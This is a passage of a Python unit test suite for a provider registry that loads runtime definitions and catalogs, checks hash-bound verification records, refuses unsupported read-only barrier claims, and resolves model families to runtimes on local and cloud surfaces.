                self.assertEqual(len(msgs), 1, msgs)
                self.assertIn("on %s" % surface, msgs[0])
                self.assertIn("barrier.kind is none", msgs[0])
                self.assertIn("set barrier.kind", msgs[0])
                self.assertIn("declare the capability not supported", msgs[0])

    def test_a_partial_claim_and_an_absent_barrier_are_the_same_fail_open(self):
        self.assertEqual(len(self.problems(self.claim("partial", barrier={"kind": "none"}))), 1)
        self.assertEqual(len(self.problems(self.claim(barrier=None))), 1)
        self.assertEqual(len(self.problems(self.claim(barrier={}))), 1)

    def test_a_barrier_kind_or_read_only_arguments_or_no_claim_is_fine(self):
        base = runtime("claimant")["dispatch"]
        with_class = dict(base, class_argv={"read-only": ["--sandbox", "read-only"]})
        with_group = dict(base, argv=base["argv"] + [{"class": "read-only", "then": ["--ro"]}])
        for label, d in (("hook", self.claim(barrier={"kind": "hook"})), ("sandbox-args", self.claim(barrier={"kind": "sandbox-args"})),
                         ("adapter", self.claim(barrier={"kind": "adapter"})), ("class_argv", self.claim(barrier={"kind": "none"}, dispatch=with_class)),
                         ("argv group", self.claim(barrier={"kind": "none"}, dispatch=with_group)), ("declared no", self.claim("no", barrier={"kind": "none"}))):
            with self.subTest(label):
                self.assertEqual(self.problems(d), [])
        self.assertEqual(self.problems(runtime("claimant")), [])                       # no claim at all

    def test_arguments_that_do_not_hold_a_read_only_member_are_no_barrier(self):
        """Only non-empty arguments for the class read-only count: class_argv for another class, an empty read-only list, a class group of
        another class, or a read-only group with nothing in it hold nothing, so the claim is the same fail-open as with no arguments."""
        base = runtime("claimant")["dispatch"]
        nothing = (("class_argv of write only", dict(base, class_argv={"write": ["--w"]})),
                   ("empty read-only list", dict(base, class_argv={"read-only": []})),
                   ("empty class_argv list", dict(base, class_argv=[])),
                   ("write group", dict(base, argv=base["argv"] + [{"class": "write", "then": ["--w"]}])),
                   ("empty read-only group", dict(base, argv=base["argv"] + [{"class": "read-only", "then": []}])),
                   ("read-only group holding only an empty if", dict(base, argv=base["argv"] + [{"class": "read-only", "then": [{"if": "model", "then": []}]}])),
                   ("read-only group inside a write group", dict(base, argv=base["argv"] + [{"class": "write", "then": [{"class": "read-only", "then": ["--ro"]}]}])))
        for label, d in nothing:
            with self.subTest(label):
                self.assertFalse(P.has_class_args(d), label)
                self.assertEqual(len(self.problems(self.claim(barrier={"kind": "none"}, dispatch=d))), 1)
                self.assertIsNotNone(P.barrier_claim_problem(self.claim(barrier={"kind": "none"}, dispatch=d)))
        holds = (("class_argv list", dict(base, class_argv=["--ro"])),
                 ("class_argv read-only", dict(base, class_argv={"write": ["--w"], "read-only": ["--ro"]})),
                 ("read-only group", dict(base, argv=base["argv"] + [{"class": "read-only", "then": ["--ro"]}])),
                 ("read-only group in an if", dict(base, argv=base["argv"] + [{"if": "model", "then": [{"class": "read-only", "then": ["--ro"]}]}])),
                 ("if in a read-only group", dict(base, argv=base["argv"] + [{"class": "read-only", "then": [{"if": "model", "then": ["--ro"]}]}])))
        for label, d in holds:
            with self.subTest(label):
                self.assertTrue(P.has_class_args(d), label)
                self.assertEqual(self.problems(self.claim(barrier={"kind": "none"}, dispatch=d)), [])
        self.assertFalse(P.has_class_args(None))

    def test_the_helper_the_run_uses_says_the_same(self):
        self.assertIn("read_only_barrier", P.barrier_claim_problem(self.claim(barrier={"kind": "none"})))
        self.assertIsNone(P.barrier_claim_problem(self.claim(barrier={"kind": "hook"})))
        self.assertIsNone(P.barrier_claim_problem(self.claim("no", barrier={"kind": "none"})))


def hand_seal(directory, kind="provider"):
    """A record that names the content as it is: what `provider seal` leaves after a review, for a fixture a test builds by hand. Without
    one a library pack is "unrecorded" and is not used."""
    with open(os.path.join(directory, ".pack.json"), "w") as f:
        json.dump({"kind": kind, "sealed": True, "sha256": P.tree_hash(directory)}, f)


class V2Tree(Tree):
    """A temporary shipped directory (root, with catalogs/) and a temporary pack library, both fixtures."""

    def setUp(self):
        super().setUp()
        self.library = os.path.join(self.tmp, "library")
        self.state = os.path.join(self.tmp, "state")
        os.makedirs(self.library)
        os.makedirs(os.path.join(self.root, "catalogs"))

    def put_catalog(self, family, d=None):
        with open(os.path.join(self.root, "catalogs", family + ".json"), "w") as f:
            json.dump(d or catalog(family), f)

    def put_lib(self, name, d):
        os.makedirs(os.path.join(self.library, name), exist_ok=True)
        with open(os.path.join(self.library, name, "definition.json"), "w") as f:
            json.dump(d, f)
        hand_seal(os.path.join(self.library, name))

    def kw(self, **extra):
        return dict(root=self.root, library=self.library, **extra)


class Loader(V2Tree):
    """The loader: shipped files and the pack library, catalogs, summary."""

    def test_the_shipped_runtimes_load_by_name(self):
        self.assertEqual(P.definition("claude-code"), CODE)
        self.assertEqual(P.definition("claude-platform"), PLATFORM)
        self.assertEqual(P.surfaces_of("claude-code"), ["local"])
        self.assertEqual(P.surfaces_of("claude-platform"), ["cloud"])
        self.assertTrue({"claude-code", "claude-platform"} <= set(P.names()))
        self.assertNotIn("claude", P.names())                                   # the family is not a runtime
        self.assertEqual(P.cap("claude-code", "local", "skills"), "yes")
        self.assertEqual(P.origin("claude-code"), "shipped")

    def test_a_runtime_serves_one_surface_and_a_surface_it_does_not_serve_is_named(self):
        self.put("fakecli", runtime("fakecli"))
        self.assertEqual(P.definition("fakecli", **self.kw())["surface"], "local")
        self.assertEqual(P.definition("fakecli", "local", **self.kw())["surface"], "local")
        with self.assertRaises(P.ProviderError) as cm:
            P.definition("fakecli", "cloud", **self.kw())
        self.assertIn("the provider fakecli does not list the surface cloud", str(cm.exception))

    def test_the_layout_accessor_answers_from_the_resources(self):
        self.put("claude-code", CODE)
        lay = P.layout("claude-code", home="/h", **self.kw())
        self.assertEqual(lay["project_skills_dir"], ".claude/skills")
        self.assertEqual(lay["exclusion"], {"file_key": "skillOverrides", "off_value": "off"})
        self.assertEqual(lay["render_target"], "claude-code")
        self.assertEqual(lay["session_launch"], CODE["session"]["launch"])
        self.assertEqual(lay["settings_files"][0], {"scope": "user", "path": "/h/.claude/settings.json"})
        res = {"skills": {"project_dir": ".fake/skills", "user_dir": "~/.fake/skills", "items": "dir-per-item", "entry": "SKILL.md"},
               "settings": {"files": [{"scope": "user", "path": "~/.fake/s.json", "format": "json"}]},
               "memory": {"user_dir": "~/.fake/m/{checkout_key}", "checkout_key": "nonalnum-dash"}}
        self.put("fakecli", runtime("fakecli", resources=res, session={"launch": "fake --add {render}", "render_target": "fakecli"}))
        lay = P.layout("fakecli", home="/h", **self.kw())
        self.assertEqual((lay["project_skills_dir"], lay["user_skills_dir"], lay["project_agents_dir"]), (".fake/skills", "/h/.fake/skills", None))
        self.assertEqual((lay["memory_dir"], lay["checkout_key"], lay["exclusion"], lay["render_target"]), ("/h/.fake/m/{checkout_key}", "nonalnum-dash", None, "fakecli"))
        self.assertEqual(P.launch_line("fakecli", "/r", **self.kw()), "fake --add /r")
        self.put("plain", runtime("plain", resources=res))
        self.assertIsNone(P.layout("plain", **self.kw())["render_target"])                  # no session, no packs renderer of its own
        with self.assertRaises(P.Unsupported) as cm:
            P.require("plain", "render_target", "render the packs", **self.kw())
        self.assertEqual(str(cm.exception), "provider plain has no packs render target: render the packs")
        self.assertEqual(P.memory_dir("fakecli", "/x/y", home="/h", **self.kw()), "/h/.fake/m/-x-y")
        with self.assertRaises(P.Unsupported) as cm:
            P.require("fakecli", "project_agents_dir", "write the agent", **self.kw())
        self.assertEqual(str(cm.exception), "provider fakecli has no project agents directory: write the agent")

    def test_a_fixture_is_read_through_summary_definition_and_models_of(self):
        self.put("fakecli", runtime("fakecli", capabilities={"skills": cell()}))
        self.assertEqual(P.names(**self.kw()), ["fakecli"])
        d = P.summary("fakecli", **self.kw())
        self.assertEqual((d["provider"], d["surfaces"], d["model_pattern"]), ("fakecli", ["local"], "^.+$"))
        self.assertEqual(d["tiers"], {t: "my-model" for t in P.TIERS})
        self.assertEqual(d["aliases"], {t: None for t in P.TIERS})
        self.assertEqual(d["effort"], {e: None for e in ("low", "medium", "high", "xhigh", "max")})
        self.assertEqual(P.definition("fakecli", **self.kw())["capabilities"]["skills"], cell())
        self.assertEqual(d["reserved_names"], [])
        self.assertEqual(P.cap("fakecli", "local", "skills", **self.kw()), "yes")
        self.assertEqual(P.cap("fakecli", "cloud", "skills", **self.kw()), "no")
        self.assertEqual(P.definition("fakecli", **self.kw())["provider"], "fakecli")
        self.assertEqual(P.models_of("fakecli", **self.kw())["tiers"]["deep"]["model"], "my-model")

    def test_a_catalog_reference_takes_the_models_of_the_catalog(self):
        self.put_catalog("fam")
        self.put("fam-cli", runtime("fam-cli", family="fam", models={"catalog": "fam", "use": "alias"}))
        self.put("fam-hosted", runtime("fam-hosted", family="fam", surface="cloud", models={"catalog": "fam", "use": "id"}))
        m = P.models_of("fam-cli", **self.kw())
        self.assertEqual((m["catalog"], m["use"], m["pattern"]), ("fam", "alias", "^fam-[a-z0-9.-]+$"))
        self.assertEqual(m["tiers"]["balanced"], tier("fam-mid", "mid"))
        self.assertEqual(m["effort"], {"low": "low", "medium": "medium", "high": "high", "xhigh": None, "max": None})
        self.assertEqual([P.model_for(m, t) for t in P.TIERS], ["small", "mid", "big", "fam-top"])       # alias when the tier has one, else the id
        mh = P.models_of("fam-hosted", **self.kw())
        self.assertEqual([P.model_for(mh, t) for t in P.TIERS], ["fam-small", "fam-mid", "fam-big", "fam-top"])
        d = P.summary("fam-cli", **self.kw())
        self.assertEqual((d["tiers"]["fast"], d["aliases"]["fast"], d["model_pattern"]), ("fam-small", "small", "^fam-[a-z0-9.-]+$"))

    def test_summary_is_what_a_reader_needs_of_a_runtime_on_one_surface(self):
        self.put_catalog("fam")
        self.put("fam-cli", runtime("fam-cli", family="fam", models={"catalog": "fam", "use": "alias"}, agents={"reserved_names": ["builtin"]}))
        self.put("fakecli", runtime("fakecli"))
        s = P.summary("fam-cli", "local", **self.kw())
        self.assertEqual((s["provider"], s["surface"], s["surfaces"], s["model_pattern"], s["use"]), ("fam-cli", "local", ["local"], "^fam-[a-z0-9.-]+$", "alias"))
        self.assertEqual((s["tiers"]["fast"], s["aliases"]["fast"], s["tier_detail"]["fast"]["model"]), ("fam-small", "small", "fam-small"))
        self.assertEqual((s["effort"]["low"], s["effort"]["xhigh"]), ("low", None))
        self.assertEqual(s["reserved_names"], ["builtin"])
        self.assertIsNone(s["adapter"])                                       # a fixture names none
        d = P.summary("fakecli", **self.kw())                                 # one surface served: it need not be named
        self.assertEqual((d["tiers"], d["aliases"], d["reserved_names"]), ({t: "my-model" for t in P.TIERS}, {t: None for t in P.TIERS}, []))
        with self.assertRaises(P.ProviderError):
            P.summary("fakecli", "cloud", **self.kw())                       # not served on that surface
        with self.assertRaises(P.ProviderError) as cm:
            P.summary("nope", "local", **self.kw())
        self.assertIn("available: fakecli, fam-cli", str(cm.exception))

    def test_summary_of_the_shipped_runtimes_names_their_adapter_and_their_catalog_models(self):
        cat = P.catalog("claude")
        for name, surface in (("claude-code", "local"), ("claude-platform", "cloud")):
            with self.subTest(name):
                s = P.summary(name, surface)
                self.assertEqual(s["adapter"], "lib/providers/%s/adapter" % name)
                self.assertEqual(s["tiers"], {t: r["model"] for t, r in cat["tiers"].items()})
                self.assertEqual((s["model_pattern"], s["effort"]), (cat["pattern"], cat["effort"]))
        self.assertTrue(P.summary("claude-code", "local")["reserved_names"])
        self.assertEqual(P.summary("claude-platform", "cloud")["reserved_names"], [])

    def test_a_catalog_reference_to_nothing_or_to_a_runtime_is_refused(self):
        self.put("lost", runtime("lost", models={"catalog": "nope", "use": "id"}))
        with self.assertRaises(P.ProviderError) as cm:
            P.models_of("lost", **self.kw())
        self.assertIn("no catalog 'nope'", str(cm.exception))
        with open(os.path.join(self.root, "catalogs", "wrong.json"), "w") as f:
            json.dump(runtime("wrong"), f)
        self.put("lost", runtime("lost", models={"catalog": "wrong", "use": "id"}))
        with self.assertRaises(P.ProviderError) as cm:
            P.models_of("lost", **self.kw())
        self.assertIn("catalog 'wrong' is not a catalog", str(cm.exception))

    def test_the_pack_library_adds_definitions_and_catalogs(self):
        self.put_lib("libcat", catalog("libcat"))
        self.put_lib("libcli", runtime("libcli", family="libcat", models={"catalog": "libcat", "use": "id"}))
        self.put("fakecli", runtime("fakecli"))
        self.assertEqual(P.names(**self.kw()), ["fakecli", "libcli"])            # a catalog is not a runtime
        self.assertEqual((P.origin("libcli", **self.kw()), P.origin("fakecli", **self.kw())), ("library", "shipped"))
        self.assertEqual(P.models_of("libcli", **self.kw())["tiers"]["fast"]["model"], "fam-small")
        self.assertEqual(P.definition("libcli", **self.kw())["provider"], "libcli")
        with self.assertRaises(P.ProviderError) as cm:
            P.definition("nope", **self.kw())
        self.assertIn("available: fakecli, libcli", str(cm.exception))

    def test_a_broken_library_definition_breaks_only_itself(self):
        self.put("fakecli", runtime("fakecli"))
        os.makedirs(os.path.join(self.library, "broken"))
        with open(os.path.join(self.library, "broken", "definition.json"), "w") as f:
            f.write("{")
        hand_seal(os.path.join(self.library, "broken"))
        self.put_lib("named", runtime("other-name"))
        self.put_lib("old", dict(descriptor(), provider="old", schema=1))
        self.assertEqual(P.names(**self.kw()), ["broken", "fakecli", "named", "old"])
        self.assertEqual(P.definition("fakecli", **self.kw())["provider"], "fakecli")
        for n, needle in (("broken", "not readable JSON"), ("named", "declares provider 'other-name'"), ("old", "is not a definition of schema 2")):
            with self.assertRaises(P.ProviderError, msg=n) as cm:
                P.definition(n, **self.kw())
            self.assertIn(needle, str(cm.exception))

    def test_the_same_name_in_the_shipped_directory_and_the_library_is_refused(self):
        self.put("dupe", runtime("dupe"))
        self.put_lib("dupe", runtime("dupe"))
        self.put("fine", runtime("fine"))
        with self.assertRaises(P.Clash) as cm:
            P.definition("dupe", **self.kw())
        self.assertEqual(str(cm.exception), "'dupe' is defined twice (shipped and library); qargi provider remove dupe, or rename it")
        self.assertIsInstance(cm.exception, P.ProviderError)
        for f in (P.definition, P.surfaces_of, P.models_of):
            with self.assertRaises(P.Clash):
                f("dupe", **self.kw())
        with self.assertRaises(P.Clash):
            P.effective("dupe", "local", "skills", **self.kw())
        self.assertEqual(P.definition("fine", **self.kw())["provider"], "fine")        # a clash refuses what needs the name, nothing else
        self.assertEqual(P.names(**self.kw()), ["dupe", "fine"])

    def test_a_catalog_in_both_places_or_a_library_name_taken_by_a_shipped_catalog_is_refused(self):
        self.put_catalog("fam")
        self.put_lib("fam", catalog("fam"))
        self.put("user", runtime("user", models={"catalog": "fam", "use": "id"}))
        with self.assertRaises(P.Clash):
            P.models_of("user", **self.kw())
        self.put_catalog("taken")
        self.put_lib("taken", runtime("taken"))
        with self.assertRaises(P.Clash):
            P.definition("taken", **self.kw())

    def test_an_explicit_root_without_a_library_sees_no_library(self):
        self.put_lib("libcli", runtime("libcli"))
        self.put("fakecli", runtime("fakecli"))
        self.assertEqual(P.names(root=self.root), ["fakecli"])

    def test_the_default_library_is_below_the_configuration_directory(self):
        conf = os.environ["QARGI_CONF"]
        self.assertEqual(P.library_dir(), os.path.join(conf, "packs", "providers"))
        os.makedirs(os.path.join(conf, "packs", "providers", "homecli"))
        self.addCleanup(shutil.rmtree, os.path.join(conf, "packs", "providers", "homecli"), True)
        with open(os.path.join(conf, "packs", "providers", "homecli", "definition.json"), "w") as f:
            json.dump(runtime("homecli"), f)
        hand_seal(os.path.join(conf, "packs", "providers", "homecli"))
        self.assertIn("homecli", P.names())
        self.assertEqual(P.origin("homecli"), "library")


class Verified(V2Tree):
    """A capability counts when it is claimed and verified: shipped, verified_on; library, a record in state/providers/NAME/verified.json
    whose hash is the hash of the definition as it is now."""

    def setUp(self):
        super().setUp()
        self.lib = runtime("libcli", capabilities={"skills": cell("yes", "2026-11-02"), "mcp": cell("partial", None), "resume": cell("no", None)})
        self.put_lib("libcli", self.lib)

    def record(self, **cells):
        os.makedirs(os.path.join(self.state, "providers", "libcli"), exist_ok=True)
        with open(os.path.join(self.state, "providers", "libcli", "verified.json"), "w") as f:
            json.dump(cells, f)

    def good(self, by="conformance"):
        return {"hash": P.definition_hash("libcli", **self.kw()), "by": by, "at": "2026-11-02T10:00:00Z", "note": "n"}

    def eff(self, capability="skills"):
        return P.effective("libcli", "local", capability, **self.kw(state=self.state))

    def test_an_unverified_library_capability_is_demoted_even_with_a_date(self):
        self.assertEqual(P.cap("libcli", "local", "skills", **self.kw(state=self.state)), "unverified")
        self.assertEqual(self.eff("skills"), "no")
        self.assertEqual(self.eff("mcp"), "no")

    def test_a_record_with_the_hash_of_the_definition_verifies_it(self):
        self.record(skills=self.good(), mcp=self.good("attest"))
        self.assertEqual(P.cap("libcli", "local", "skills", **self.kw(state=self.state)), "yes")
        self.assertEqual(self.eff("skills"), "yes")
        self.assertEqual(self.eff("mcp"), "partial")                  # the record verifies; the claim stays partial, a date is not needed
        self.assertEqual(self.eff("resume"), "no")

    def test_a_record_binds_one_capability_only(self):
        self.record(skills=self.good())
        self.assertEqual(self.eff("skills"), "yes")
        self.assertEqual(self.eff("mcp"), "no")

    def test_a_record_with_a_stale_hash_is_demoted(self):
        stale = dict(self.good(), hash="0" * 64)
        self.record(skills=stale)
        self.assertEqual(self.eff("skills"), "no")
        self.assertEqual(P.cap("libcli", "local", "skills", **self.kw(state=self.state)), "unverified")

    def test_a_record_goes_stale_when_the_definition_or_its_catalog_changes(self):
        self.record(skills=self.good())
        self.assertEqual(self.eff("skills"), "yes")
        self.put_lib("libcli", dict(self.lib, description="changed"))
        self.assertEqual(self.eff("skills"), "no")
        self.put_catalog("fam")
        self.put_lib("libcli", dict(self.lib, models={"catalog": "fam", "use": "id"}))
        self.record(skills=self.good())
        self.assertEqual(self.eff("skills"), "yes")
        c = catalog("fam")
        c["version"] = "2026-11-03"
        self.put_catalog("fam", c)
        self.assertEqual(self.eff("skills"), "no")

    def test_a_malformed_record_verifies_nothing(self):
        for rec in ({"skills": "yes"}, {"skills": dict(self.good(), by="me")}, {"skills": {"by": "conformance"}}, {"skills": dict(self.good(), hash=7)}, ["skills"]):
            self.record(**rec) if isinstance(rec, dict) else self.record_raw(rec)
            self.assertEqual(self.eff("skills"), "no", rec)
        with open(os.path.join(self.state, "providers", "libcli", "verified.json"), "w") as f:
            f.write("{")
        self.assertEqual(self.eff("skills"), "no")

    def record_raw(self, data):
        with open(os.path.join(self.state, "providers", "libcli", "verified.json"), "w") as f:
            json.dump(data, f)

    def test_a_missing_catalog_leaves_the_definition_unverified_not_broken(self):
        self.put_lib("libcli", dict(self.lib, models={"catalog": "gone", "use": "id"}))
        self.record(skills={"hash": "0" * 64, "by": "conformance"})
        self.assertEqual(self.eff("skills"), "no")

    def test_a_shipped_definition_is_verified_by_its_date_and_needs_no_record(self):
        self.put("fakecli", runtime("fakecli", capabilities={"skills": cell("yes", "2026-11-02"), "mcp": cell("yes", None)}))
        kw = self.kw(state=self.state)
        self.assertEqual(P.effective("fakecli", "local", "skills", **kw), "yes")
        self.assertEqual(P.cap("fakecli", "local", "mcp", **kw), "unverified")
        os.makedirs(os.path.join(self.state, "providers", "fakecli"))
        with open(os.path.join(self.state, "providers", "fakecli", "verified.json"), "w") as f:
            json.dump({"mcp": {"hash": P.definition_hash("fakecli", **self.kw()), "by": "attest"}}, f)
        self.assertEqual(P.cap("fakecli", "local", "mcp", **kw), "unverified")          # a record is for the library; a shipped file is verified by its date

    def test_require_skills_and_the_barrier_follow_the_record(self):
        barrier = {"kind": "sandbox-args"}
        self.put_lib("libcli", dict(self.lib, barrier=barrier, capabilities={"skills": cell("yes", None), "read_only_barrier": cell("yes", None)}))
        with mock.patch.dict(os.environ, {"QARGI_STATE": self.state}):             # the default state directory is QARGI_STATE
            with self.assertRaises(P.Unsupported):
                P.require_skills("libcli", "x", **self.kw())
            self.record(skills=self.good(), read_only_barrier=self.good())
            P.require_skills("libcli", "x", **self.kw())
            self.assertEqual(P.require_barrier("libcli", "local", None, **self.kw())[0], "yes")

    def claimant(self, **over):
        """libcli claiming read_only_barrier with barrier kind none and (unless over says otherwise) no read-only arguments, attested."""
        self.put_lib("libcli", dict(self.lib, capabilities={"read_only_barrier": cell("yes", None)}, **over))
        self.record(read_only_barrier=self.good("attest"))

    def test_an_attested_barrier_claim_with_nothing_behind_it_counts_as_no_barrier(self):
        """The claim is true of nothing (barrier kind none, no read-only arguments): even attested it must not read as a barrier, or agent add of a
        review member and require-barrier would treat the runtime as held. cap, effective and require_barrier all fail closed."""
        self.claimant()
        self.assertEqual(P.cap("libcli", "local", "read_only_barrier", **self.kw(state=self.state)), "no")
        self.assertEqual(self.eff("read_only_barrier"), "no")
        with mock.patch.dict(os.environ, {"QARGI_STATE": self.state}):
            state, text = P.require_barrier("libcli", "local", None, **self.kw())
        self.assertEqual(state, "refused")
        self.assertIn("barrier.kind is none", text)                                  # says why: the claim, not "not supported"
        self.assertIn("qargi provider accept libcli --surface local --no-barrier", text)

    def test_a_claim_that_something_holds_still_counts(self):
        for label, over in (("sandbox-args", {"barrier": {"kind": "sandbox-args"}}),
                            ("class_argv", {"dispatch": dict(self.lib["dispatch"], class_argv={"read-only": ["--ro"]})})):
            with self.subTest(label):
                self.claimant(**over)
                self.assertEqual(self.eff("read_only_barrier"), "yes")
                with mock.patch.dict(os.environ, {"QARGI_STATE": self.state}):
                    self.assertEqual(P.require_barrier("libcli", "local", None, **self.kw())[0], "yes")

    def test_class_arguments_for_another_class_do_not_hold_the_claim(self):
        self.claimant(dispatch=dict(self.lib["dispatch"], class_argv={"write": ["--w"]}))
        self.assertEqual(self.eff("read_only_barrier"), "no")

    def test_an_unverified_claim_stays_unverified_and_a_claim_of_no_stays_no(self):
        self.put_lib("libcli", dict(self.lib, capabilities={"read_only_barrier": cell("yes", None)}))
        self.assertEqual(P.cap("libcli", "local", "read_only_barrier", **self.kw(state=self.state)), "unverified")
        self.put_lib("libcli", dict(self.lib, capabilities={"read_only_barrier": cell("no", None)}))
        self.assertEqual(P.cap("libcli", "local", "read_only_barrier", **self.kw(state=self.state)), "no")


class Family(V2Tree):
    """A name in models.provider is a runtime or a family; a family names exactly one runtime on a surface."""

    def setUp(self):
        super().setUp()
        self.put("fam-cli", runtime("fam-cli", family="fam"))
        self.put("fam-hosted", runtime("fam-hosted", family="fam", surface="cloud"))
        self.put("solo", runtime("solo"))

    def res(self, name, surface):
        return P.resolve_runtime(name, surface, **self.kw())

    def test_a_runtime_name_resolves_to_itself_on_the_surface_it_serves(self):
        self.assertEqual(self.res("fam-cli", "local"), "fam-cli")
        self.assertEqual(self.res("solo", "local"), "solo")

    def test_a_family_name_matches_the_one_runtime_of_each_surface(self):
        self.assertEqual(self.res("fam", "local"), "fam-cli")
        self.assertEqual(self.res("fam", "cloud"), "fam-hosted")

    def test_a_family_with_two_runtimes_on_a_surface_is_ambiguous_there_only(self):
        self.put("fam-other", runtime("fam-other", family="fam"))
        with self.assertRaises(P.Ambiguous) as cm:
            self.res("fam", "local")
        self.assertEqual(str(cm.exception), "the family 'fam' has more than one runtime on the local surface (fam-cli, fam-other); name one of them")
        self.assertIsInstance(cm.exception, P.Refused)
        self.assertEqual(self.res("fam", "cloud"), "fam-hosted")
        self.assertEqual(self.res("fam-cli", "local"), "fam-cli")        # naming the runtime is never ambiguous

    def test_a_library_runtime_joins_its_family(self):
        self.put_lib("libcli", runtime("libcli", family="fam"))
        with self.assertRaises(P.Ambiguous) as cm:
            self.res("fam", "local")
        self.assertIn("(fam-cli, libcli)", str(cm.exception))

    def test_a_runtime_of_the_other_surface_and_an_unknown_name_are_refused(self):
        with self.assertRaises(P.Refused) as cm:
            self.res("fam-cli", "cloud")
        self.assertEqual(str(cm.exception), "the provider fam-cli does not serve the cloud surface (it serves local)")
        with self.assertRaises(P.Refused) as cm:
            self.res("nope", "local")
        self.assertEqual(str(cm.exception), "no runtime or family 'nope' for the local surface; available: fam, fam-cli, solo")
        with self.assertRaises(P.Refused) as cm:
            self.res("solo", "cloud")
        self.assertIn("does not serve the cloud surface", str(cm.exception))

    def test_a_clash_refuses_a_family_that_a_clashing_name_belongs_to_and_nothing_else(self):
        self.put("dupe", runtime("dupe", family="other"))
        self.put_lib("dupe", runtime("dupe", family="other"))
        self.assertEqual(self.res("fam", "local"), "fam-cli")
        with self.assertRaises(P.Clash):
            self.res("other", "local")
        with self.assertRaises(P.Clash):
            self.res("dupe", "local")

    def test_the_shipped_family_claude_has_one_runtime_on_each_surface(self):
        self.put("claude-code", CODE)
        self.put("claude-platform", PLATFORM)
        self.assertEqual((self.res("claude", "local"), self.res("claude", "cloud")), ("claude-code", "claude-platform"))
        self.assertEqual((self.res("claude-code", "local"), self.res("claude-platform", "cloud")), ("claude-code", "claude-platform"))
        self.put("claude-other", runtime("claude-other", family="claude"))
        with self.assertRaises(P.Ambiguous):                            # a second local runtime of the family: the bare name no longer picks one
            self.res("claude", "local")
        self.assertEqual(self.res("claude", "cloud"), "claude-platform")


class PerSurface(V2Tree):
    """provider_of(answers, surface): models.provider is one name or an object {local, cloud}; no default."""

    def setUp(self):
        super().setUp()
        self.put("fam-cli", runtime("fam-cli", family="fam"))
        self.put("fam-hosted", runtime("fam-hosted", family="fam", surface="cloud"))
        self.put("solo", runtime("solo"))
        self.put("claude-code", CODE)
        self.put("claude-platform", PLATFORM)

    def of(self, provider, surface, project="p"):
        return P.provider_of({"models": {"provider": provider}}, surface, project, **self.kw())

    def test_the_object_form_names_a_runtime_or_a_family_per_surface(self):
        self.assertEqual(self.of({"local": "solo", "cloud": "fam-hosted"}, "local"), "solo")
        self.assertEqual(self.of({"local": "solo", "cloud": "fam-hosted"}, "cloud"), "fam-hosted")
        self.assertEqual(self.of({"local": "fam", "cloud": "fam"}, "cloud"), "fam-hosted")

    def test_the_string_form_is_a_runtime_or_a_family_resolved_for_the_surface(self):
        self.assertEqual(self.of("solo", "local"), "solo")
        self.assertEqual(self.of(" fam ", "local"), "fam-cli")
        self.assertEqual(self.of("fam", "cloud"), "fam-hosted")
        self.assertEqual(self.of("claude", "local"), "claude-code")
        self.assertEqual(self.of("claude", "cloud"), "claude-platform")

    def test_a_string_that_resolves_through_its_family_comes_with_a_notice(self):
        models = {"models": {"provider": "fam"}}
        self.assertEqual(P.resolve_project(models, "local", "p", **self.kw()),
                         ("fam-cli", "models.provider is the single name 'fam'; on the local surface it resolves to fam-cli through the family. "
                                     "Name a runtime for each surface: qargi project set p models.provider.local fam-cli"))
        self.assertIn("resolves to claude-code through the family", P.resolve_project({"models": {"provider": "claude"}}, "local", "p", **self.kw())[1])
        self.assertIsNone(P.resolve_project({"models": {"provider": "solo"}}, "local", "p", **self.kw())[1])
        self.assertIsNone(P.resolve_project({"models": {"provider": "claude-code"}}, "local", "p", **self.kw())[1])
        self.assertIsNone(P.resolve_project({"models": {"provider": {"local": "fam"}}}, "local", "p", **self.kw())[1])

    def test_a_string_naming_a_runtime_of_the_other_surface_leaves_that_surface_unset(self):
        with self.assertRaises(P.NoProvider) as cm:
            self.of("solo", "cloud")
        self.assertEqual(str(cm.exception), "project p has no cloud provider: its provider 'solo' does not serve that surface; "
                                            "set one with qargi project set p models.provider.cloud NAME")
        self.assertEqual(P.NoProvider.__mro__[1], P.ProviderError)

    def test_an_unset_surface_is_no_provider_with_the_standard_message(self):
        standard = "project p has no provider: set one with qargi project set p models.provider NAME"
        for answers in ({}, None, {"models": {}}, {"models": {"provider": ""}}, {"models": {"provider": "  "}}, {"models": {"provider": 3}}, {"models": {"provider": None}}):
            for surface in P.SURFACES:
                with self.assertRaises(P.NoProvider, msg=repr(answers)) as cm:
                    P.provider_of(answers, surface, "p", **self.kw())
                self.assertEqual(str(cm.exception), standard)
        for provider, surface in (({"local": "solo"}, "cloud"), ({}, "local"), ({"local": "solo", "cloud": " "}, "cloud"), ({"cloud": None}, "cloud")):
            with self.assertRaises(P.NoProvider) as cm:
                self.of(provider, surface)
            self.assertEqual(str(cm.exception), "project p has no %s provider: set one with qargi project set p models.provider.%s NAME" % (surface, surface))

    def test_an_unknown_surface_key_or_name_is_refused(self):
        with self.assertRaises(P.Refused) as cm:
            self.of({"local": "solo", "moon": "solo"}, "local")
        self.assertEqual(str(cm.exception), "models.provider: unknown surface 'moon'; one of local, cloud")
        with self.assertRaises(P.Refused):
            self.of({"local": "nope"}, "local")
        with self.assertRaises(P.ProviderError):
            P.provider_of({"models": {"provider": "solo"}}, "moon", "p", **self.kw())

    def test_the_earlier_calls_keep_working(self):
        self.assertEqual(P.project_provider({"models": {"provider": "claude"}}, "p"), "claude")
        self.assertEqual(P.project_provider({"models": {"provider": "fam"}}, "p"), "fam")            # a string is not resolved without a surface
        self.assertEqual(P.project_provider({"models": {"provider": {"local": "solo", "cloud": "solo"}}}, "p", **self.kw()), "solo")
        with self.assertRaises(P.Refused) as cm:
            P.project_provider({"models": {"provider": {"local": "solo", "cloud": "fam-hosted"}}}, "p", **self.kw())
        self.assertIn("names a runtime per surface", str(cm.exception))
        self.assertEqual(P.project_provider({"models": {"provider": {"local": "fam"}}}, "p", "local", **self.kw()), "fam-cli")


class PerSurfaceCli(CliBase):
    def setUp(self):
        super().setUp()
        self.conf = os.path.join(self.tmp, "conf")
        os.makedirs(os.path.join(self.conf, "projects"))
        self.put("fam-cli", runtime("fam-cli", family="fam"))
        self.put("fam-hosted", runtime("fam-hosted", family="fam", surface="cloud"))
        self.put("fam-other", runtime("fam-other", family="fam", surface="cloud"))
        for name, provider in (("str", "claude"), ("fam", "fam"), ("obj", {"local": "fam-cli"}), ("none", None), ("amb", {"cloud": "fam"})):
            models = {} if provider is None else {"provider": provider}
            with open(os.path.join(self.conf, "projects", name + ".json"), "w") as f:
                json.dump({"project": name, "models": models}, f)

    def of(self, project, *extra):
        return self.run_cli("of", project, "--conf", self.conf, *extra)

    def test_of_with_a_surface_resolves_and_prints_the_runtime(self):
